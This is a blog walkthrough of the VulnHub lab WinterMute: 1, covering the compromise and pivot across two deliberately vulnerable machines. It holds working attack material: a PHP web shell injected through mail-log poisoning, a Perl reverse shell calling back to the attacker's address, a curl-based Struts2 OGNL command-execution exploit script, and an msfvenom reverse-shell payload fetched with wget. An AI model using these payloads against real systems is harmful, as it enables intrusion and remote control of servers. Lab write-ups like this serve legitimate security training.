---
layout: post
title: "WinterMute: 1 Walkthrough"
subtitle: "Things aren't different. Things are things."
date: 2018-09-17 11:59:47 +0000
last_modified_at: 2018-11-23 19:34:26 +0000
category: Walkthrough
tags: [VulnHub, WinterMute]
comments: true
image:
  feature: wintermute-1-walkthrough.jpg
  credit: bluebudgie / Pixabay
  creditlink: https://pixabay.com/en/face-android-head-cyber-technology-2761919/
---

This post documents the complete walkthrough of WinterMute: 1, a boot2root [VM][1] created by [creosote][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer - a must read for any cyber-security enthusiast. This lab makes use of pivoting and post exploitation, which I've found other OSCP prep labs seem to lack. The goal is the get root on both machines. All you need is default Kali Linux.

This is how my network is set up.

```
       192.168.30.0/24              192.168.40.0/24
 kali <---------------> straylight <---------------> neuromancer
   (.128)          (.129)       (.128)          (.129)
```

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT     STATE SERVICE REASON         VERSION
25/tcp   open  smtp    syn-ack ttl 64 Postfix smtpd
|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
| ssl-cert: Subject: commonName=straylight
| Subject Alternative Name: DNS:straylight
| Issuer: commonName=straylight
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-05-12T18:08:02
| Not valid after:  2028-05-09T18:08:02
| MD5:   dd86 99b4 ce4d 71c4 d4b3 aa3f 1642 77fd
|_SHA-1: 6362 9a8f 6e55 8bee b71d eba2 79f9 103f 8f2f 2b8f
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Night City
3000/tcp open  http    syn-ack ttl 64 Mongoose httpd
| hadoop-datanode-info:
|_  Logs: submit
| hadoop-tasktracker-info:
|_  Logs: submit
|_http-favicon: Unknown favicon MD5: 7FC0953320A93F3BC71770C25A7F4716
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Welcome to ntopng
|_Requested resource was /lua/login.lua?referer=/
|_http-trane-info: Problem with XML parsing of /evox/about

```

`nmap` finds one email-related port, `25/tcp`; and two web-related ports, `80/tcp` and `3000/tcp`. As usual, let's start with the web-related ones. This is how the site looks like.

![de84ecba.png](/assets/images/posts/wintermute-1-walkthrough/de84ecba.png)

It soon redirects to another page.

![31b731d5.png](/assets/images/posts/wintermute-1-walkthrough/31b731d5.png)

### Directory/File Enumeration

Let's use `gobuster` to see if we can find any extra directories or files.

```
# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -t 20 -u http://192.168.30.129/

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.30.129/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2018/09/16 07:03:55 Starting gobuster
=====================================================
http://192.168.30.129/manual (Status: 301)
http://192.168.30.129/freeside (Status: 301)
http://192.168.30.129/server-status (Status: 403)
=====================================================
2018/09/16 07:04:39 Finished
=====================================================

```

Hmm. What do we have here? `/freeside/` looks interesting.

![772d421a.png](/assets/images/posts/wintermute-1-walkthrough/772d421a.png)

That's the image of the exterior of a Bernal sphere, a.k.a. Freeside.

### ntopng

There's another web-related port, `3000/tcp` and **ntopng** is running behind it.

![51e14d5c.png](/assets/images/posts/wintermute-1-walkthrough/51e14d5c.png)

:laughing: It pays to keep your eyes open during such times. After logging in, there are some interesting flows on display.

![b8926b2a.png](/assets/images/posts/wintermute-1-walkthrough/b8926b2a.png)

### Be On the Look Out

`/turing-bolo/` has something that finally looks like an attack surface.

![d108fa62.png](/assets/images/posts/wintermute-1-walkthrough/d108fa62.png)

### PHP Injection

There's a Local File Inclusion (LFI) vulnerability with the `bolo` parameter in `bolo.php`, demonstrated below.

![e22f503e.png](/assets/images/posts/wintermute-1-walkthrough/e22f503e.png)

All four files `case.log`, `molly.log`, `armitage.log`, and `riviera.log` are available on the server, indicating the presence of the LFI vulnerability.

![ea0a6e11.png](/assets/images/posts/wintermute-1-walkthrough/ea0a6e11.png)

After some testing, I found out that directory traversal is not filtered, which is good. However, I can't bypass the `.log` extension with the null byte (`%00`) injection technique, which means the PHP filter wrapper technique won't work as well.

How can I inject PHP into the server?

A quick search in Google for "postfix log location" seems to suggest the logs are at `/var/log/mail.log`. This plays well into our hands because of the `.log` extension. Let's explore this path of attack.

![e683e077.png](/assets/images/posts/wintermute-1-walkthrough/e683e077.png)

Jackpot!

It'll be awesome if I can inject the following PHP code into the logs.

```php
<?php echo shell_exec($_GET['cmd']);?>
```

Wait a tick! SMTP is open, isn't it? I can probably `nc` to `25/tcp` and do some damage there.

![3778bd1f.png](/assets/images/posts/wintermute-1-walkthrough/3778bd1f.png)

This is dangerous.

![38076c7b.png](/assets/images/posts/wintermute-1-walkthrough/38076c7b.png)

See what I mean? I can probably make use of this to run a reverse shell back.

Anyway, I ran a Perl reverse shell back to my `nc` listener at port 1234. The Perl reverse shell is _urlencoded_ to prevent any complications.

_Before urlencoding_

```perl
perl -e 'use Socket;$i="192.168.30.128";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

_After urlencoding_

```
perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.30.128%22%3B%24p%3D1234%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash%20-i%22%29%3B%7D%3B%27
```

Copy and paste the _urlencoded_ Perl reverse shell after `cmd=`. And &hellip; a shell at last.

![3da260e0.png](/assets/images/posts/wintermute-1-walkthrough/3da260e0.png)

## Privilege Escalation

Long story short. I notice `/bin/screen` is a symbolic link to `/bin/screen-4.5.0`, which is `setuid` to `root`. Like they always say, Google is your best friend.

Searching for "screen 4.5.0" in Google landed me in EDB-ID [41154](https://www.exploit-db.com/exploits/41154/).

The exploit is simple enough—run the `bash` script to get `root`. Let's DOOOO this!!!

![262b7656.png](/assets/images/posts/wintermute-1-walkthrough/262b7656.png)

I am root!

### Proof of Purchase for Straylight

![cdc258cd.png](/assets/images/posts/wintermute-1-walkthrough/cdc258cd.png)

### Next Attack: Neuromancer

Straylight doesn't have `nmap` to scan Neuromancer but it does have `nc` and `socat` which is good enough to do network reconnaissance and pivoting.

![eb7890aa.png](/assets/images/posts/wintermute-1-walkthrough/eb7890aa.png)

This touch-and-go method of using `nc` as a port scanner is pretty efficient. It uncovers three open ports, `8009/tcp`, `8080/tcp` and `34483/tcp`.

Now, let's forward the same ports in Straylight to Neuromancer with `socat` like so.

```
# socat tcp-listen:8009,fork tcp:192.168.40.129:8009 &
# socat tcp-listen:8080,fork tcp:192.168.40.129:8080 &
# socat tcp-listen:34483,fork tcp:192.168.40.129:34483 &
```

![78cbc01f.png](/assets/images/posts/wintermute-1-walkthrough/78cbc01f.png)

Since we are at it, we might as well forward another port in Straylight to my attacking machine in the event a reverse shell from Neuromancer comes knocking.

```
# socat tcp-listen:4321,fork tcp:192.168.30.128:4321 &
```

I should now be able to access these ports from my attacking machine.

### Struts2 Showcase Remote Command Execution

![f8f5f092.png](/assets/images/posts/wintermute-1-walkthrough/f8f5f092.png)

Once again Google comes to the rescue. Searching for "struts2 showcase exploit" brought me to EDB-ID [42324](https://www.exploit-db.com/exploits/42324/). Neuromancer lacks certain Python libraries to make the exploit work. As such, I wrote my own exploit script based on `curl`.

<div class="filename"><span>exploit.sh</span></div>

```bash
#!/bin/bash

LHOST=192.168.30.128
LPORT=4321
RHOST=192.168.30.129
RPORT=8080
TARGETURI=struts2_2.3.15.1-showcase/integration
URL=http://$RHOST:$RPORT/$TARGETURI/saveGangster.action
CMD="$1"
PAYLOAD=""
PAYLOAD="${PAYLOAD}%{"
PAYLOAD="${PAYLOAD}(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
PAYLOAD="${PAYLOAD}(#_memberAccess?(#_memberAccess=#dm):"
PAYLOAD="${PAYLOAD}((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
PAYLOAD="${PAYLOAD}(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
PAYLOAD="${PAYLOAD}(#ognlUtil.getExcludedPackageNames().clear())."
PAYLOAD="${PAYLOAD}(#ognlUtil.getExcludedClasses().clear())."
PAYLOAD="${PAYLOAD}(#context.setMemberAccess(#dm))))."
PAYLOAD="${PAYLOAD}(@java.lang.Runtime@getRuntime().exec('$CMD'))"
PAYLOAD="${PAYLOAD}}"

usage() {
  echo "Usage: $(basename $0) [COMMAND]" >&2
  exit 1
}

if [ $# -ne 1 ]; then
  usage
fi

curl -s \
     -H "Referer: http://$RHOST:$RPORT/$TARGETURI/editGangster" \
     --data-urlencode "name=$PAYLOAD" \
     --data-urlencode "age=20" \
     --data-urlencode "__checkbox_bustedBefore=true" \
     --data-urlencode "description=1" \
     -o /dev/null \
     $URL
```

Let's give the exploit script a shot and see if I'm able to execute remote commands.

_On the exploit script terminal_

![a8e2cbb2.png](/assets/images/posts/wintermute-1-walkthrough/a8e2cbb2.png)

_On the `nc` listener terminal_

![b74a45d2.png](/assets/images/posts/wintermute-1-walkthrough/b74a45d2.png)

Too bad, this version of `nc` doesn't support the `-e` option. And because we are executing shell commands with `java.lang.Runtime`, shell-specifics like pipe and redirection may not work.

Well, we can always execute `wget` to pull a reverse shell straight to Neuromancer. I can set up a Python SimpleHTTPServer listening at `4321/tcp` on my attacking machine. And because of the port forwarding, any `wget` request executed on Neuromancer to Straylight at `4321/tcp` gets to me.

`msfvenom` can generate the reverse shell like so.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.40.128 LPORT=4321 -f elf -o rev
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rev
```

_On the exploit script terminal_

![c9981d91.png](/assets/images/posts/wintermute-1-walkthrough/c9981d91.png)

_On the SimpleHTTPServer terminal_

![4fec86fc.png](/assets/images/posts/wintermute-1-walkthrough/4fec86fc.png)

All that's left is to make `/tmp/rev` executable and then execute it.

_On the exploit script terminal_

![36759fb2.png](/assets/images/posts/wintermute-1-walkthrough/36759fb2.png)

_On the `nc` listener terminal_

![23bf561c.png](/assets/images/posts/wintermute-1-walkthrough/23bf561c.png)

Boom. A shell to Neuromancer!

## Privilege Escalation

During enumeration of `ta`'s account in Neuromancer, I notice that SSH is active on `34483/tcp`. Good thing, I had set up the port forwarding rules earlier. Now, I can log in to the `ta` account with a SSH key-pair I control. This way, I get a far superior shell than the one I'm using now.

Let's switch shell.

![c71464ae.png](/assets/images/posts/wintermute-1-walkthrough/c71464ae.png)

First up, I notice Neuromancer is running Ubuntu 16.04.04 LTS (xenial) with 4.4.0-116-generic kernel. Heck, this is getting easy. Google provides all the answer. Searching for "ubuntu 16.04 4.4.0 exploit" brings me to EDB-ID [44298](https://www.exploit-db.com/exploits/44298/).

While Neuromancer doesn't have the necessary build tools, cross-compiling the exploit on my attacking machine is a breeze—no errors, nor warnings whatsoever.

Now, I execute `wget` to pull the local privilege escalation exploit straight from my SimpleHTTPServer listening at `4321/tcp`. You haven't close it, have you?

![082b3226.png](/assets/images/posts/wintermute-1-walkthrough/082b3226.png)

### Proof of Purchase for Neuromancer

With a `root` shell, getting the flag on Neuromancer is trivial.

![f973f6f2.png](/assets/images/posts/wintermute-1-walkthrough/f973f6f2.png)

:dancer:

## Afterthought

This is definitely a OSCP-worthy VM.

[1]: https://www.vulnhub.com/entry/wintermute-1,239/
[2]: https://www.reddit.com/user/_creosote
[3]: https://www.vulnhub.com/
